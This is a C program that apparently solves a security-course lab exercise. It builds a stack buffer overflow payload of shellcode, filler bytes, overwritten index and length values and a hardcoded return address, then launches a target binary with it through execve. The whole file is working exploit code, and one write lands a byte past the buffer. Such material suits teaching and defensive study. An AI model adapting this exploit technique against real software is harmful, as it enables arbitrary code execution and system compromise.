#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"
#define BUFFER_SIZE 284

int main (int argc, char* argv[]) {
        char*   args[3];
        char*   env[2];
        int i;
        args[0] = TARGET;

        // Write a value greater than 272 into len
        char exploit[BUFFER_SIZE];
        strcpy(exploit, shellcode);

        // Enter non-null-terminators
        for (i = 45; i < BUFFER_SIZE; i++) {
                exploit[i] = 0x01;
        }

        char overwrite_val = 0x0B; // 267 no-op
        char* overwrite_i = (char*) (exploit + 264);
        *overwrite_i = overwrite_val;

        overwrite_val = 0x1B; // 283
        char* overwrite_len = (char*) (exploit + 268);
        *overwrite_len = overwrite_val;
        exploit[270] = 0x00;
        exploit[271] = 0x00;

        int return_add = 0x2021fd40;
        int* overwrite_ret = (int*) (exploit + 280);
        *overwrite_ret = return_add;

        exploit[BUFFER_SIZE] = '\0';

        args[1] = exploit;
        args[2] = NULL;

        env[0] = &exploit[271];
        env[1] = &exploit[272];

        if ( execve (TARGET, args, env) < 0 )
                fprintf (stderr, "execve failed.\n");

        return 1;
}
